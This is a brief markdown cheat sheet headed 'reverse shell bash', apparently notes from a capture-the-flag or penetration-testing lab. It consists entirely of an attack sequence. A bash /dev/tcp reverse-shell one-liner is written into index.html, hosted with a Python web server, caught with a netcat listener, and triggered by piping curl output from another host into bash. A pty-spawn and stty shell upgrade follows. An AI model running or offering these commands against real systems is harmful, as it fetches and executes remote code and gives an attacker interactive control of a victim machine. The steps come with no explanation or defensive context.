# Bash

**reverse shell bash**

```bash
echo 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1' > index.html
sudo python3 -m http.server 80
nc -lvnp 4444
curl 10.10.14.2|bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL + Z
stty raw -echo
fg
<return>
```

